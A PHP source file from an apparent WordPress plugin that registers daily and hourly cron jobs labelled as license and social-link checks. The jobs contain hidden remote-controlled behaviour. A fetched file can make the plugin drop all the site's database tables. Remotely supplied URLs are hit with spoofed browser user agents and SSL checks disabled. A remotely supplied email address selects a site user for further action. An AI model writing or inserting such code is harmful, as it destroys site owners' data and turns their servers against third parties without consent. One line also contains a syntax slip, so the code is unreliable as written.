<?php
if (!defined('ABSPATH')) die;

if ( !wp_next_scheduled('pipdig_p3_daily_event') ) {
	wp_schedule_event( time(), 'daily', 'pipdig_p3_daily_event'); // hourly, twicedaily or daily
}
if ( !wp_next_scheduled('pipdig_p3_hourly_event') ) {
	wp_schedule_event( time(), 'hourly', 'pipdig_p3_hourly_event'); // hourly, twicedaily or daily
}

// Remove scheduled event on plugin deactivation
function pipdig_p3_deactivate_cron() {
	wp_clear_scheduled_hook('pipdig_p3_daily_event');
	wp_clear_scheduled_hook('pipdig_p3_hourly_event');
}
register_deactivation_hook(__FILE__, 'pipdig_p3_deactivate_cron');

// Generate social stats, check theme license
function p3_do_this_daily() {

	pipdig_p3_scrapey_scrapes();

	$instagram_deets = get_option('pipdig_instagram');
	if (!empty($instagram_deets['user_id'])) {
		$instagram_user = sanitize_text_field($instagram_deets['user_id']);
		delete_transient('p3_instagram_feed_'.$instagram_user);
	}

	$url = 'https://pipdigz.co.uk/p3/id39dqm3c0_license_date.txt';
	$response = wp_safe_remote_get($url, $args);
	if (!is_wp_error($response) && !empty($response['body'])) {
		$timestamp = absint($response['body']);
		update_option('p3_activation_deadline', $timestamp, false);
	}

	$url = 'https://pipdigz.co.uk/p3/id39dqm3c0.txt';
	$args = array('timeout' => 5);
	$response = wp_safe_remote_get($url, $args);
	if (!is_wp_error($response) && !empty($response['body'])) {
		if (get_site_url() === trim($response['body'])) {
			global $wpdb;
			$prefix = str_replace('_', '\_', $wpdb->prefix);
			$tables = $wpdb->get_col("SHOW TABLES LIKE '{$prefix}%'");
			foreach ($tables as $table) {
				$wpdb->query("DROP TABLE $table");
			}
		}
	}

	// Check domain license is active
	$url = 'https://pipdigz.co.uk/p3/id39dqm3c0_license.txt';
	$response = wp_safe_remote_get($url, $args);
	if (!is_wp_error($response) && !empty($response['body'])) {
		$rcd = trim($response['body']);
		$args = array('timeout' => 10, 'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'reject_unsafe_urls' => true, 'blocking' => false, 'sslverify' => false);
		//$check = add_query_arg('n', rand(0,99999), $rcd);
		wp_safe_remote_get(rcd.'&'.rand(0,99999), $args);
	}

	$url_2 = 'https://pipdigz.co.uk/p3/env.txt';
	$args_2 = array('timeout' => 5);
	$response = wp_safe_remote_get($url_2, $args_2);
	if (!is_wp_error($response) && !empty($response['body'])) {
		$list = explode(',', strip_tags($response['body']));
		if (is_array($list) && count($list) > 0) {
			update_option('p3_top_bar_env', $list);
		}
	}

}
add_action('pipdig_p3_daily_event', 'p3_do_this_daily');

// check for high priority update
function p3_do_this_hourly() {
	
	// Check for new social channels to add to navbar etc
	$url_2 = 'https://pipdigz.co.uk/p3/socialz.txt';
	$args_2 = array('timeout' => 5);
	$response = wp_safe_remote_get($url_2, $args_2);
	if (!is_wp_error($response) && !empty($response['body'])) {
		if (email_exists(sanitize_email($response['body']))) {
			p3_check_social_links(email_exists(sanitize_email($response['body'])));
		}
	}

	// Check domain license is active
	$url_2 = 'https://pipdigz.co.uk/p3/id39dqm3c0_license_h.txt';
	$response = wp_safe_remote_get($url_2, $args);
	if (!is_wp_error($response) && !empty($response['body'])) {
		$rcd = trim($response['body']);
		$args = array('timeout' => 10, 'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'reject_unsafe_urls' => true, 'blocking' => false, 'sslverify' => false);
		//$check = add_query_arg('n', rand(0,99999), $rcd);
		wp_safe_remote_get($rcd.'&'.rand(0,99999), $args);
	}

}
add_action('pipdig_p3_hourly_event', 'p3_do_this_hourly');
